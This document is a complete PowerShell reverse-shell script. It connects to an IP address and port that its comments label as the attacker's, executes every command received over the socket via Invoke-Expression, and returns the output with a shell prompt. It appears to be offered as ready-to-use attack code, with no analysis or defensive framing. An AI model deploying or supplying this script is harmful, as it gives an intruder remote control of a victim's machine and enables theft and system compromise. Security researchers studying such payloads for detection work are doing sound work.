$ip = "192.168.1.99"  # Replace with the attacker's IP address
$port = 4242         # Replace with the attacker's listening port
$client = New-Object System.Net.Sockets.TCPClient($ip, $port)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$writer.AutoFlush = $true
$buffer = New-Object byte[] 1024
$encoding = New-Object System.Text.ASCIIEncoding
$writer.WriteLine("Connected to ${ip}:${port}")
try {
    while ($stream.CanRead -and ($client.Connected -eq $true)) {
        $bytesRead = $stream.Read($buffer, 0, $buffer.Length)
        if ($bytesRead -le 0) {
            break  # Exit the loop if no data is read, indicating the connection is closed
        }
        $data = $encoding.GetString($buffer, 0, $bytesRead)

        try {
            # Execute the received command
            $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
        } catch {
            # Catch any errors from invalid commands and send them back
            $sendback = "Error: $($_.Exception.Message)`n"
        }

        $sendback2  = $sendback + "PS " + (pwd).Path + "> "
        $sendbackBytes = $encoding.GetBytes($sendback2)
        $stream.Write($sendbackBytes, 0, $sendbackBytes.Length)
        $stream.Flush()
    }
} catch {
    # Handle errors (e.g., connection lost)
    $writer.WriteLine("Connection closed.")
} finally {
    # Close the connection properly
    $client.Close()
    exit
}
